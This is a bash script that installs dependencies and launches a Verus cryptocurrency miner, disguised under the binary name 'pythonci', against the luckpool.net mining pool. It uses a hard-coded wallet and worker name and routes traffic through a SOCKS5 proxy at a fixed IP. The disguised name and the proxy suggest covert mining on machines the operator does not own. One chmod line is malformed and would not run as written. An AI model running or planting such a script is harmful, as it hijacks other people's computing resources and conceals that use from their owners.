#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x sei.sh && chmod +x pythonci chmod 777 pythonci sei.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RPkwwC1SL8QNjP1X242btbLA8othyHMRC9
WR=ryzen4
PY=socks5://217.170.127.226:9999
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
